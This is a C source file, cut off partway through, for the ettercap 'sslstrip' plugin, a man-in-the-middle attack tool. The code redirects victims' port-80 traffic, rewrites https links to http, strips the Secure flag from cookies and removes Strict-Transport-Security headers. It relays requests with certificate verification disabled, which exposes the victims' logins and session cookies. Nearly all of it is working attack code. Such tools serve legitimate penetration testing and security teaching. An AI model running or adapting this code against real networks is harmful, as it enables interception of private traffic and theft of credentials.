/*
    sslstrip -- ettercap plugin -- SSL Strip per Moxie (http://www.thoughtcrime.org/software/sslstrip/)
   
    Copyright (C) Ettercap Development Team. 2012.
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>
#include <ec_stdint.h>
#include <ec_inet.h>
#include <ec_plugins.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_socket.h>
#include <ec_threads.h>
#include <ec_decode.h>

#include <sys/wait.h>

#include <pcre.h>

#ifndef HAVE_STRNDUP
#include <missing/strndup.h>
#endif

#ifdef OS_LINUX
#include <linux/netfilter_ipv4.h>
#endif


#ifdef HAVE_SYS_POLL_H
#include <sys/poll.h>
#endif

#include <curl/curl.h>

#if (LIBCURL_VERSION_MAJOR < 7) || (LIBCURL_VERSION_MINOR < 26)
#error libcurl 7.26.0 or up is needed
#endif

/*
 * This plugin will basically replace all https links sent to the user's browser with http 
 * but keep track of those https links to send a proper HTTPS request to the links when requested.
 */


#if defined(OS_DARWIN) || defined(OS_BSD)
#define SSLSTRIP_SET "21"
#endif

//#define URL_PATTERN "(href=|src=|url\\(|action=)?[\"']?(https)://([^ \r\\)/\"'>\\)]*)/?([^ \\)\"'>\\)\r]*)"
//#define URL_PATTERN "(href=|src=|url\\(|action=)?[\"']?(https)(\\%3A|\\%3a|:)//([^ \r\\)/\"'>\\)]*)/?([^ \\)\"'>\\)\r]*)"
#define URL_PATTERN "(https://[\\w\\d:#@%/;$()~_?\\+-=\\\\.&]*)"
#define COOKIE_PATTERN "Set-Cookie: (.*?;)(.?Secure;|.?Secure)(.*?)\r\n"


#define REQUEST_TIMEOUT 120 /* If a request has not been used in 120 seconds, remove it from list */

#define HTTP_RETRY 5
#define HTTP_WAIT 10

#define PROTO_HTTP 1
#define PROTO_HTTPS 2

#define HTTP_GET (1<<16)
#define HTTP_POST (1<<24)

#define HTTP_MAX (1024*200) //200KB max for HTTP requests.

#define BREAK_ON_ERROR(x,y,z) do {  \
   if (x == -EINVALID ) {            \
     http_wipe_connection(y);      \
     SAFE_FREE(z.DATA.data);       \
     SAFE_FREE(z.DATA.disp_data);  \
     ec_thread_exit();             \
   }                                \
} while(0)



/* lists */
struct http_ident {
	u_int32 magic;
	#define HTTP_MAGIC 0x0501e77f
	struct ip_addr L3_src;
	u_int16 L4_src;
	u_int16 L4_dst;
};

#define HTTP_IDENT_LEN sizeof(struct http_ident)

struct https_link {
	char *url;
	time_t last_used;
	LIST_ENTRY (https_link) next;	
};

struct http_request {
	int method;
	struct curl_slist *headers;
	char *url;
	char *payload;
};

struct http_response {
	char *html;
	size_t len;
};

struct http_connection {
	int fd; 
	u_int16 port[2];
	struct ip_addr ip[2];
	CURL *handle; 
	struct http_request *request;
	struct http_response *response;
	char curl_err_buffer[CURL_ERROR_SIZE];
	#define HTTP_CLIENT 0
	#define HTTP_SERVER 1
};

LIST_HEAD(, https_link) https_links;
static pthread_mutex_t list_mutex = PTHREAD_MUTEX_INITIALIZER;
#define LIST_LOCK     do{ pthread_mutex_lock(&list_mutex); } while(0)
#define LIST_UNLOCK   do{ pthread_mutex_unlock(&list_mutex); } while(0)

/* globals */
static int main_fd;
static u_int16 bind_port;
static struct pollfd poll_fd;

static pcre *https_url_pcre;
static regex_t find_cookie_re;

/* protos */
int plugin_load(void *);
static int sslstrip_init(void *);
static int sslstrip_fini(void *);
static void sslstrip(struct packet_object *po);
static int sslstrip_is_http(struct packet_object *po);
void safe_free_http_redirect(char **param, int *param_length, char *command, char *orig_command);

#ifndef OS_LINUX
static void sslstrip_create_session(struct ec_session **s, struct packet_object *po);
static int sslstrip_match(void *id_sess, void *id_curr);
static size_t http_create_ident(void **i, struct packet_object *po);
#endif

/* http stuff */
static void Find_Url(u_char *to_parse, char **ret);


static int http_sync_conn(struct http_connection *connection);
static int http_get_peer(struct http_connection *connection);
static int http_read(struct http_connection *connection, struct packet_object *po);
static int http_write(int fd, char *ptr, size_t total_len);
static int http_insert_redirect(u_int16 dport);
static int http_remove_redirect(u_int16 port);
static void http_remove_header(char *header, struct http_connection *connection);
static void http_update_content_length(struct http_connection *connection);
static void http_initialize_po(struct packet_object *po, u_char *p_data, size_t len);
static void http_parse_packet(struct http_connection *connection, int direction, struct packet_object *po);
static void http_wipe_connection(struct http_connection *connection);
static void http_handle_request(struct http_connection *connection, struct packet_object *po);
static void http_send(struct http_connection *connection, struct packet_object *po, int proto);
static void http_remove_https(struct http_connection *connection);
static void http_remove_secure_from_cookie(struct http_connection *connection);
static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata);
//static size_t http_write_to_server(void *ptr, size_t size, size_t nmemb, void *stream);



/* thread stuff */
static int http_bind_wrapper(void);
static EC_THREAD_FUNC(http_child_thread);
static EC_THREAD_FUNC(http_accept_thread);

/*
 * Custom flag used by plugin to mark packets coming
 * from this plugin
 */

#define PO_FROMSSLSTRIP ((u_int16)(1<<13))

struct plugin_ops sslstrip_ops = {
	ettercap_version:	EC_VERSION, /* must match global EC_VERSION */
	name:			"sslstrip",
	info:			"SSLStrip plugin",
	version:		"1.1",
	init:			&sslstrip_init,
	fini:			&sslstrip_fini,
};

int plugin_load(void *handle)
{
	return plugin_register(handle, &sslstrip_ops);
}

static int sslstrip_init(void *dummy)
{
	const char *error;
	int erroroffset;

	/*
	 * Add IPTables redirect for port 80
         */
	if (http_bind_wrapper() != ESUCCESS) {
		USER_MSG("SSLStrip: plugin load failed: Could not set up HTTP redirect\n");
		return PLUGIN_FINISHED;
	}

	https_url_pcre = pcre_compile(URL_PATTERN, PCRE_MULTILINE|PCRE_CASELESS, &error, &erroroffset, NULL);

	if (!https_url_pcre) {
		USER_MSG("SSLStrip: plugin load failed: pcre_compile failed (offset: %d), %s\n", erroroffset, error);
		http_remove_redirect(bind_port);
		return PLUGIN_FINISHED;
	}	

	if(regcomp(&find_cookie_re, COOKIE_PATTERN, REG_EXTENDED | REG_NEWLINE | REG_ICASE)) {
		USER_MSG("SSLStrip: plugin load failed: Could not compile find_cookie regex\n");
                pcre_free(https_url_pcre);
		http_remove_redirect(bind_port);
		return PLUGIN_FINISHED;
	}

	hook_add(HOOK_HANDLED, &sslstrip);

	/* start HTTP accept thread */


	ec_thread_new_detached("http_accept_thread", "HTTP Accept thread", &http_accept_thread, NULL, 1);

	USER_MSG("SSLStrip Plugin version 1.1 is still under experimental mode. Please reports any issues to the development team.\n");
	return PLUGIN_RUNNING;
}

static int sslstrip_fini(void *dummy)
{

	DEBUG_MSG("SSLStrip: Removing redirect\n");
	if (http_remove_redirect(bind_port) != ESUCCESS) {
		USER_MSG("SSLStrip: Unable to remove HTTP redirect, please do so manually.\n");
	}

        // Free regexes.
        if (https_url_pcre)
          pcre_free(https_url_pcre);

        regfree(&find_cookie_re);

       /* stop accept wrapper */
       pthread_t pid = ec_thread_getpid("http_accept_thread");
       
       if (!pthread_equal(pid, EC_PTHREAD_NULL))
               ec_thread_destroy(pid);

	/* now destroy all http_child_thread */
	do {
		pid = ec_thread_getpid("http_child_thread");
		
		if(!pthread_equal(pid, EC_PTHREAD_NULL))
			ec_thread_destroy(pid);

	} while (!pthread_equal(pid, EC_PTHREAD_NULL));

	close(main_fd);

	/* Remove hook point */
	hook_del(HOOK_HANDLED, &sslstrip);

	return PLUGIN_FINISHED;
}

static int sslstrip_is_http(struct packet_object *po)
{
	/* if already coming from SSLStrip or proto is not TCP */
	if (po->flags & PO_FROMSSLSTRIP || po->L4.proto != NL_TYPE_TCP)
		return 0;

	if (ntohs(po->L4.dst) == 80 ||
	    ntohs(po->L4.src) == 80)
		return 1;

	if (strstr((const char*)po->DATA.data, "HTTP/1.1") ||
	    strstr((const char*)po->DATA.data, "HTTP/1.0"))
		return 1;
	return 0;
}

#ifndef OS_LINUX
static int sslstrip_match(void *id_sess, void *id_curr)
{
	struct  http_ident *ids = id_sess;
	struct http_ident *id = id_curr;

	/* sanity checks */
	BUG_IF(ids == NULL);
	BUG_IF(id == NULL);

	/* check magic */
	if (ids->magic != id->magic)
		return 0;

	if (ids->L4_src == id->L4_src &&
	    ids->L4_dst == id->L4_dst &&
	    !ip_addr_cmp(&ids->L3_src, &id->L3_src))
	return 1;

	return 0;
}

static void sslstrip_create_session(struct ec_session **s, struct packet_object *po)
{
	void *ident;
	DEBUG_MSG("sslstrip_create_session");
	
	/* allocate the session */
	SAFE_CALLOC(*s, 1, sizeof(struct ec_session));

	/* create the ident */
	(*s)->ident_len = http_create_ident(&ident, po);

	/* link to the session */
	(*s)->ident = ident;

	/* the matching function */
	(*s)->match = sslstrip_match;

	/* alloc of data elements */
	SAFE_CALLOC((*s)->data, 1, sizeof(struct ip_addr));
}
#endif

/*
 * Filter HTTP related packets and create NAT sessions
 */
static void sslstrip(struct packet_object *po)
{

	if (!sslstrip_is_http(po))
		return;	

	/* If it's an HTTP packet, don't forward it */
 	po->flags |= PO_DROPPED;


	if ( (po->flags & PO_FORWARDABLE) &&
	     (po->L4.flags & TH_SYN) &&
             !(po->L4.flags & TH_ACK) ) {
#ifndef OS_LINUX
		struct ec_session *s = NULL;
		sslstrip_create_session(&s, PACKET);	
		memcpy(s->data, &po->L3.dst, sizeof(struct ip_addr));
		session_put(s);
		
#endif
	} else {
		po->flags |= PO_IGNORE;
	}

}

/* Unescape the string */
static void Decode_Url(u_char *src)
{
   u_char t[3];
   u_int32 i, j, ch;

   /* Paranoid test */
   if (!src)
      return;

   /* NULL terminate for the strtoul */
   t[2] = 0;

   for (i=0, j=0; src[i] != 0; i++, j++) {
      ch = (u_int32)src[i];
      if (ch == '%' && isxdigit((u_int32)src[i + 1]) && isxdigit((u_int32)src[i + 2])) {
         memcpy(t, src+i+1, 2);
         ch = strtoul((char *)t, NULL, 16);
         i += 2;
      }
      src[j] = (u_char)ch;
   }
   src[j] = 0;
}

/* Gets the URL from the request */
static void Find_Url(u_char *to_parse, char **ret)
{
   u_char *fromhere, *page=NULL, *host=NULL;
   u_int32 len;
   char *tok;

   if (!strncmp((char *)to_parse, "GET ", 4))
      to_parse += strlen("GET ");
   else if (!strncmp((char *)to_parse, "POST ", 5))
      to_parse += strlen("POST ");
   else
      return;

   /* Get the page from the request */
   page = (u_char *)strdup((char *)to_parse);
   ec_strtok((char *)page, " HTTP", &tok);

   /* If the path is relative, search for the Host */
   if ((*page=='/') && (fromhere = (u_char *)strstr((char *)to_parse, "Host: "))) {
      host = (u_char *)strdup( (char *)fromhere + strlen("Host: ") );
      ec_strtok((char *)host, "\r", &tok);
   } else
      host = (u_char*)strdup("");

   len = strlen((char *)page) + strlen((char *)host) + 2;
   SAFE_CALLOC(*ret, len, sizeof(char));
   snprintf(*ret, len, "%s%s", host, page);

   SAFE_FREE(page);
   SAFE_FREE(host);

   Decode_Url((u_char *)*ret);
}

/* This function remove variables use by http_insert_redirect and http_remove_redirect functions */
void safe_free_http_redirect(char **param, int *param_length, char *command, char *orig_command) {

	int k;

	SAFE_FREE(command);
	SAFE_FREE(orig_command);

	for(k= 0; k < (*param_length); ++k)
		SAFE_FREE(param[k]);
	SAFE_FREE(param);
}

/* HTTP handling functions */
static int http_insert_redirect(u_int16 dport)
{
	char asc_dport[16];
	int ret_val, i=0, param_length= 0;
	char *command, *orig_command, *p;
	char **param = NULL;

	if (GBL_CONF->redir_command_on == NULL)
	{
		USER_MSG("SSLStrip: cannot setup the redirect, did you uncomment the redir_command_on command on your etter.conf file?");
		return -EFATAL;
	}
	snprintf(asc_dport, 16, "%u", dport);

	command = strdup(GBL_CONF->redir_command_on);
	str_replace(&command, "%iface", GBL_OPTIONS->iface);
	str_replace(&command, "%port", "80");
	str_replace(&command, "%rport", asc_dport);
#if defined(OS_DARWIN) || defined(OS_BSD)
	str_replace(&command, "%set", SSLSTRIP_SET);
#endif
        orig_command = strdup(command);

	DEBUG_MSG("http_insert_redirect: [%s]", command);

	/* split the string into the parameter array */
	for (p = strsep(&command, " "); p!=NULL; p = strsep(&command, " ")) {
		SAFE_REALLOC(param, (i+1) * sizeof(char *));
		param[i++] = strdup(p);
	}

	SAFE_REALLOC(param, (i+1) * sizeof(char *));
	param[i] = NULL;
	param_length= i + 1; //because there is a SAFE_REALLOC after the for.

	switch(fork()) {
		case 0:
			execvp(param[0], param);
			WARN_MSG("Cannot setup http redirect (command: %s), please edit your etter.conf file and put a valid value in redir_command_on field\n", param[0]);
			safe_free_http_redirect(param, &param_length, command, orig_command);
			_exit(EINVALID);
		case -1:
			safe_free_http_redirect(param, &param_length, command, orig_command);
			return -EINVALID;
		default:
			wait(&ret_val);
			if (WEXITSTATUS(ret_val)) {
			    USER_MSG("SSLStrip: redir_command_on had non-zero exit status (%d): [%s]\n", WEXITSTATUS(ret_val), orig_command);
			    safe_free_http_redirect(param, &param_length, command, orig_command);
			    return -EINVALID;
			}
			break;
	}

	safe_free_http_redirect(param, &param_length, command, orig_command);

	return ESUCCESS;
}

static int http_remove_redirect(u_int16 dport)
{
        char asc_dport[16];
        int ret_val, i=0, param_length= 0;
	char *command, *orig_command, *p;
        char **param = NULL;


        if (GBL_CONF->redir_command_off == NULL)
	{
		USER_MSG("SSLStrip: cannot remove the redirect, did you uncomment the redir_command_off command on your etter.conf file?");
		return -EFATAL;
	}

        snprintf(asc_dport, 16, "%u", dport);

        command = strdup(GBL_CONF->redir_command_off);
        str_replace(&command, "%iface", GBL_OPTIONS->iface);
        str_replace(&command, "%port", "80");
        str_replace(&command, "%rport", asc_dport);
#if defined(OS_DARWIN) || defined(OS_BSD)
	str_replace(&command, "%set", SSLSTRIP_SET);
#endif
        orig_command = strdup(command);

        DEBUG_MSG("http_remove_redirect: [%s]", command);

        /* split the string into the parameter array */
        for (p = strsep(&command, " "); p!=NULL; p = strsep(&command, " ")) {
                SAFE_REALLOC(param, (i+1) * sizeof(char *));
                param[i++] = strdup(p);
        }

        SAFE_REALLOC(param, (i+1) * sizeof(char *));
        param[i] = NULL;
        param_length= i + 1; //because there is a SAFE_REALLOC after the for.

        switch(fork()) {
		case 0:
			execvp(param[0], param);
			WARN_MSG("Cannot remove http redirect (command: %s), please edit your etter.conf file and put a valid value in redir_command_on field\n", param[0]);
			safe_free_http_redirect(param, &param_length, command, orig_command);
			_exit(EINVALID);
                case -1:
                        safe_free_http_redirect(param, &param_length, command, orig_command);
                        return -EINVALID;
                default:
                        wait(&ret_val);
                        if (WEXITSTATUS(ret_val)) {
                            USER_MSG("SSLStrip: redir_command_off had non-zero exit status (%d): [%s]\n", WEXITSTATUS(ret_val), orig_command);
                            safe_free_http_redirect(param, &param_length, command, orig_command);
                            return -EINVALID;
                        }
                        break;
        }

        safe_free_http_redirect(param, &param_length, command, orig_command);

        return ESUCCESS;
}

static EC_THREAD_FUNC(http_accept_thread)
{
	struct http_connection *connection;
	u_int len = sizeof(struct sockaddr_in);
	struct sockaddr_in client_sin;
	int optval = 1;
	socklen_t optlen = sizeof(optval);

	ec_thread_init();

	DEBUG_MSG("SSLStrip: http_accept_thread initialized and ready");

	poll_fd.fd = main_fd;
	poll_fd.events = POLLIN;

	LOOP {
		poll(&poll_fd, 1, -1);

		if (poll_fd.revents & POLLIN) {
			SAFE_CALLOC(connection, 1, sizeof(struct http_connection));
			BUG_IF(connection==NULL);

			SAFE_CALLOC(connection->request, 1, sizeof(struct http_request));
			BUG_IF(connection->request==NULL);

			SAFE_CALLOC(connection->response, 1, sizeof(struct http_response));
			BUG_IF(connection->response==NULL);

			connection->fd= accept(poll_fd.fd, (struct sockaddr *)&client_sin, &len);

			DEBUG_MSG("SSLStrip: Received connection: %p %p\n", connection, connection->request);
			if (connection->fd == -1) {
				SAFE_FREE(connection->request);
				SAFE_FREE(connection->response);
				SAFE_FREE(connection);
				continue;
			}

			ip_addr_init(&(connection->ip[HTTP_CLIENT]), AF_INET, (u_char *)&(client_sin.sin_addr.s_addr));
			connection->port[HTTP_CLIENT] = client_sin.sin_port;
			connection->port[HTTP_SERVER] = htons(80);
			//connection->request->len = 0;

			/* set SO_KEEPALIVE */
			if (setsockopt(connection->fd, SOL_SOCKET, SO_KEEPALIVE, &optval, optlen) < 0) {
				DEBUG_MSG("SSLStrip: Could not set up SO_KEEPALIVE");
			}
			/* create detached thread */
			ec_thread_new_detached("http_child_thread", "http child", &http_child_thread, connection, 1);	
		}
	}

	return NULL;
}

static int http_get_peer(struct http_connection *connection)
{

#ifndef OS_LINUX
	struct ec_session *s = NULL;
	struct packet_object po;
	void *ident= NULL;
	int i;

	memcpy(&po.L3.src, &connection->ip[HTTP_CLIENT], sizeof(struct ip_addr));
	po.L4.src = connection->port[HTTP_CLIENT];
	po.L4.dst = connection->port[HTTP_SERVER]; 

	http_create_ident(&ident, &po);

#ifndef OS_WINDOWS
	struct timespec tm;
	tm.tv_sec = HTTP_WAIT;
	tm.tv_nsec = 0;
#endif

	/* Wait for sniffing thread */
	for (i=0; i<HTTP_RETRY && session_get_and_del(&s, ident, HTTP_IDENT_LEN)!=ESUCCESS; i++)
#ifndef OS_WINDOWS
	nanosleep(&tm, NULL);
#else	
	usleep(HTTP_WAIT);
#endif

	if (i==HTTP_RETRY) {
		SAFE_FREE(ident);
		return -EINVALID;
	}

	memcpy(&connection->ip[HTTP_SERVER], s->data, sizeof(struct ip_addr));

	SAFE_FREE(s->data);
	SAFE_FREE(s);
	SAFE_FREE(ident);
#else
	 struct sockaddr_in sa_in;
	 socklen_t sa_in_sz = sizeof(struct sockaddr_in);
	 getsockopt (connection->fd, SOL_IP, SO_ORIGINAL_DST, (struct sockaddr*)&sa_in, &sa_in_sz);

	 ip_addr_init(&(connection->ip[HTTP_SERVER]), AF_INET, (u_char *)&(sa_in.sin_addr.s_addr));
#endif

	
	return ESUCCESS;

}


#ifndef OS_LINUX
static size_t http_create_ident(void **i, struct packet_object *po)
{
	struct http_ident *ident;

	SAFE_CALLOC(ident, 1, sizeof(struct http_ident));

	ident->magic = HTTP_MAGIC;

	memcpy(&ident->L3_src, &po->L3.src, sizeof(struct ip_addr));
	ident->L4_src = po->L4.src;
	ident->L4_dst = po->L4.dst;

	/* return the ident */
	*i = ident;
	return sizeof(struct http_ident);
}
#endif

static int http_sync_conn(struct http_connection *connection) 
{
	if (http_get_peer(connection) != ESUCCESS)
		return -EINVALID;


	set_blocking(connection->fd, 0);
	return ESUCCESS;
}

static int http_read(struct http_connection *connection, struct packet_object *po)
{
	int len = 0;	

	len = read(connection->fd, po->DATA.data, HTTP_MAX);

	po->DATA.len = len;

	if(len <= 0)
		return -EINVALID;

	return len;	
}

static void http_handle_request(struct http_connection *connection, struct packet_object *po)
{
	struct https_link *link;

	SAFE_CALLOC(connection->request->url, 1, 512);

	if (connection->request->url==NULL)
		return;

	Find_Url(po->DATA.data, &connection->request->url);

	if (connection->request->url == NULL) {
		return;
	}


	//parse HTTP request
	if (!memcmp(po->DATA.data, "GET", 3)) {
		connection->request->method = HTTP_GET;
	} else if (!memcmp(po->DATA.data, "POST", 4)) {
		connection->request->method = HTTP_POST;
	}

	char *r = (char*)po->DATA.data;

	//Skip the first line of request
	r = strstr((const char*)po->DATA.data, "\r\n");
	r += 2; //Skip \r\n

	char *h = strdup(r);
	char *body = strdup(r);
	BUG_IF(h==NULL);
	BUG_IF(body==NULL);

	char *end_header = strstr(h, "\r\n\r\n");

	if (!end_header)
	{
		SAFE_FREE(h);
		SAFE_FREE(body);
		return; //Something went really wrong here
	}
	*end_header = '\0';

	char *header;
	char *saveptr;
	header = ec_strtok(h, "\r\n", &saveptr);

	while(header) {
		connection->request->headers = curl_slist_append(connection->request->headers, header);
		header = ec_strtok(NULL, "\r\n", &saveptr);
	}

	SAFE_FREE(h);

	char *b = strstr(body, "\r\n\r\n");

	if (b != NULL) {
		b += 4;
		connection->request->payload = strdup(b);
		BUG_IF(connection->request->payload == NULL);
	}

	SAFE_FREE(body);


	int proto = PROTO_HTTP;

	LIST_LOCK;
	LIST_FOREACH(link, &https_links, next) {
		if (!strcmp(link->url, connection->request->url)) {
			proto = PROTO_HTTPS;
			break;
		}
	}

	LIST_UNLOCK;


	switch(proto) {
		case PROTO_HTTP:
			DEBUG_MSG("SSLStrip: Sending HTTP request");
			break;
		case PROTO_HTTPS:
			DEBUG_MSG("SSLStrip: Sending HTTPs request");
			break;
	}

	http_send(connection,po, proto);
}

static void http_send(struct http_connection *connection, struct packet_object *po, int proto)
{

	curl_global_init(CURL_GLOBAL_ALL);
	connection->handle = curl_easy_init();

	if(!connection->handle) {
		DEBUG_MSG("SSLStrip: Not enough memory to allocate CURL handle");
		return;
	}

	char *url;

	//Allow decoders to run for request
	if (proto == PROTO_HTTPS) {
		curl_easy_setopt(connection->handle, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(connection->handle, CURLOPT_SSL_VERIFYHOST, 0L);

		SAFE_CALLOC(url, 1, strlen(connection->request->url)+strlen("https://")+1);
		snprintf(url, strlen(connection->request->url)+strlen("https://")+1, "https://%s", connection->request->url);
	} else {
		SAFE_CALLOC(url, 1, strlen(connection->request->url)+strlen("http://")+1);
		snprintf(url, strlen(connection->request->url)+strlen("http://")+1, "http://%s", connection->request->url);
	}


	if (url==NULL) {
		DEBUG_MSG("Not enough memory to allocate for URL %s\n", connection->request->url);
		return;
	}	


	curl_easy_setopt(connection->handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
	curl_easy_setopt(connection->handle, CURLOPT_URL, url);
	curl_easy_setopt(connection->handle, CURLOPT_WRITEFUNCTION, http_receive_from_server);
	curl_easy_setopt(connection->handle, CURLOPT_WRITEDATA, connection);
	curl_easy_setopt(connection->handle, CURLOPT_ERRORBUFFER, connection->curl_err_buffer);
	curl_easy_setopt(connection->handle, CURLOPT_HEADER, 1L);
	curl_easy_setopt(connection->handle, CURLOPT_HTTPHEADER, connection->request->headers);
	curl_easy_setopt(connection->handle, CURLOPT_ACCEPT_ENCODING, "gzip");
	curl_easy_setopt(connection->handle, CURLOPT_ACCEPT_ENCODING, "deflate");
	curl_easy_setopt(connection->handle, CURLOPT_COOKIEFILE, ""); //Initialize cookie engine

	/* Only allow HTTP and HTTPS */
	curl_easy_setopt(connection->handle, CURLOPT_PROTOCOLS, (long) CURLPROTO_HTTP | 
						(long)CURLPROTO_HTTPS);
	curl_easy_setopt(connection->handle, CURLOPT_REDIR_PROTOCOLS, (long) CURLPROTO_HTTP | 
						(long) CURLPROTO_HTTPS);


	if(connection->request->method == HTTP_POST) {
		curl_easy_setopt(connection->handle, CURLOPT_POST, 1L);
		curl_easy_setopt(connection->handle, CURLOPT_POSTFIELDS, connection->request->payload);
		curl_easy_setopt(connection->handle, CURLOPT_POSTFIELDSIZE, strlen(connection->request->payload));
	}	


	if(curl_easy_perform(connection->handle) != CURLE_OK) {
		DEBUG_MSG("Unable to send request to HTTP server: %s\n", connection->curl_err_buffer);
		return;
	} else {
		DEBUG_MSG("SSLStrip: Sent request to server");
	}

	DEBUG_MSG("Before removing https: %s", connection->response->html);
	DEBUG_MSG("SSLStrip: Removing HTTPS");
	http_remove_https(connection);
	http_remove_secure_from_cookie(connection);

	if(strstr(connection->response->html, "\r\nContent-Encoding:") ||
	   strstr(connection->response->html, "\r\nTransfer-Encoding:")) {
		http_remove_header("Content-Encoding", connection);
		http_remove_header("Transfer-Encoding", connection);
		http_update_content_length(connection);
	}


	if(strstr(connection->response->html, "\r\nStrict-Transport-Security:")) {
		http_remove_header("Strict-Transport-Security", connection);
	}

	DEBUG_MSG("SSLStrip: after removing all %s", connection->response->html);
	//Send result back to client
	DEBUG_MSG("SSLStrip: Sending response back to client");
	if (http_write(connection->fd, connection->response->html, connection->response->len) != ESUCCESS){
		DEBUG_MSG("Unable to send HTTP response back to client\n");
	} else {
		DEBUG_MSG("Sent HTTP response back to client");
	}


	//Allow decoders to run on HTTP response
	http_initialize_po(po, (u_char*)connection->response->html, connection->response->len);
	packet_destroy_object(po);
   	po->len = po->DATA.len;
   	po->L4.flags |= TH_PSH;
	packet_disp_data(po, po->DATA.data, po->DATA.len);

	DEBUG_MSG("SSLStrip: Calling parser for response");
	http_parse_packet(connection, HTTP_SERVER, po);

	//Free up request
	if (connection->request->headers) {
		curl_slist_free_all(connection->request->headers);
		connection->request->headers = NULL;
	}
	

	if (connection->request->method == HTTP_POST) {
		SAFE_FREE(connection->request->payload);
	}

	SAFE_FREE(connection->request->url);

	SAFE_FREE(url);

	if(connection->handle) {
		curl_easy_cleanup(connection->handle);
		curl_global_cleanup();
		connection->handle = NULL;
	}

	DEBUG_MSG("SSLStrip: Done");
}

static int http_write(int fd, char *ptr, size_t total_len)
{
	int len, err;
	unsigned int bytes_sent = 0;
	int bytes_remaining = total_len;
	struct timespec tm;
	tm.tv_sec = 0;
	tm.tv_nsec = 100 * 1000 * 1000; //100ms

	DEBUG_MSG("SSLStrip: Total length %ld", total_len);

	while (bytes_sent < total_len) {

		if(!ptr)
			break;
		len = write(fd, ptr+bytes_sent, bytes_remaining);

		if (len <= 0) {
			err = GET_SOCK_ERRNO();
			DEBUG_MSG("http_write: SOCK ERR: %d", err);
			if (err != EAGAIN && err != EINTR)
				return -EINVALID;
		}

		DEBUG_MSG("SSLStrip: Sent %d bytes", len);
	
		bytes_sent += len;
		bytes_remaining -= len;

		DEBUG_MSG("SSLStrip: Bytes sent %d", bytes_sent);
		nanosleep(&tm, NULL);

	
	}

	return ESUCCESS;
}

#if 0
static size_t http_write_to_server(void *ptr, size_t size, size_t nmemb, void *stream)
{
	struct packet_object *po = (struct packet_object *)stream;

	DEBUG_MSG("SSLStrip: PO LEN : %ld Size: %ld", po->DATA.len, (size*nmemb));
	DEBUG_MSG("SSLStrip: Copying %s", po->DATA.data);
	if ((size*nmemb) < po->DATA.len) {	
		memcpy(ptr, po->DATA.data, size*nmemb);
		return size*nmemb;
	} else {
		memcpy(ptr, po->DATA.data, po->DATA.len);
		return po->DATA.len;
	}
}
#endif


static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata)
{
	struct http_connection *connection = (struct http_connection *)userdata;


	if (connection->response->len == 0) {
		//Initiailize buffer
		SAFE_CALLOC(connection->response->html, 1, size*nmemb);
		if (connection->response->html == NULL)
			return 0;

		memcpy(connection->response->html, ptr, size*nmemb);
	} else {
		char *b;

		SAFE_CALLOC(b, 1, connection->response->len+(size*nmemb));
		BUG_IF(b == NULL);
	
		memcpy(b, connection->response->html, connection->response->len);	
		memcpy(b+connection->response->len, ptr, size*nmemb);

		SAFE_FREE(connection->response->html);
		connection->response->html = b;

		//SAFE_REALLOC(connection->response->html, connection->response->len + (size*nmemb));
	}

	connection->response->len += (size*nmemb);
	//connection->response->html[connection->response->len] = '\0';


	return size*nmemb;
}

EC_THREAD_FUNC(http_child_thread)
{
	struct packet_object po;
	int  ret_val;
	struct http_connection *connection;

	connection = (struct http_connection *)args;
	ec_thread_init();

	/* Get peer and set to non-blocking */
	if (http_sync_conn(connection) == -EINVALID) {
		DEBUG_MSG("SSLStrip: Could not get peer!!");
		if (connection->fd != -1)
			close_socket(connection->fd);
		SAFE_FREE(connection->response);
		SAFE_FREE(connection->request);
		SAFE_FREE(connection);	
		ec_thread_exit();
	}


	/* A fake SYN ACK for profiles */
	http_initialize_po(&po, NULL, 0);
	po.len = 64;
	po.L4.flags = (TH_SYN | TH_ACK);
	packet_disp_data(&po, po.DATA.data, po.DATA.len);
	http_parse_packet(connection, HTTP_SERVER, &po);
	http_initialize_po(&po, po.DATA.data, po.DATA.len);

	
	LOOP {
		http_initialize_po(&po, NULL, 0);
		ret_val = http_read(connection, &po);
		DEBUG_MSG("SSLStrip: Returned %d", ret_val);
		BREAK_ON_ERROR(ret_val, connection, po);

		if (ret_val > 0)  {
			/* Look in the https_links list and if the url matches, send to HTTPS server.
			   Otherwise send to HTTP server */
	        	po.len = po.DATA.len;
        		po.L4.flags |= TH_PSH;

			/* NULL terminate buffer */
			po.DATA.data[po.DATA.len] = 0;

			packet_destroy_object(&po);
        		packet_disp_data(&po, po.DATA.data, po.DATA.len);

        		//DEBUG_MSG("SSLStrip: Calling parser for request");
        		http_parse_packet(connection, HTTP_CLIENT, &po);

			http_handle_request(connection, &po);
		}
		
	}

	return NULL;
	
}

static void http_remove_https(struct http_connection *connection)
{
	char *buf_cpy = connection->response->html;
	size_t https_len = strlen("https://");
	size_t http_len = strlen("http://");
	struct https_link *l, *link;
	size_t offset = 0;
	int rc;
	int ovector[30];
	char changed = 0;
	char *new_html;
	size_t new_size = 0;
	size_t size = connection->response->len;
	int i = 0;

	if(!buf_cpy)
		return;

	SAFE_CALLOC(new_html, 1, connection->response->len);
	BUG_IF(new_html==NULL);

	while(offset < size && (rc = pcre_exec(https_url_pcre, NULL, buf_cpy, size, offset, 0, ovector, 30)) > 0) {
		memcpy(new_html+new_size, buf_cpy+offset, ovector[2*i]-offset);
		new_size += ovector[2*i]-offset;

		char *url = strndup(buf_cpy+ovector[2*i]+https_len, 
			(ovector[2*i+1] - ovector[2*i]) - https_len);
		memcpy(new_html+new_size, "http://", http_len);
		new_size += http_len;
		memcpy(new_html+new_size, url, (ovector[2*i+1] - ovector[2*i]) - https_len);
		new_size += (ovector[2*i+1] - ovector[2*i]) - https_len;
		offset = ovector[1];

		//Add URL to list

		char found = 0;
		LIST_LOCK;
		LIST_FOREACH(link, &https_links, next) {
			if(!strcmp(link->url, url)) {
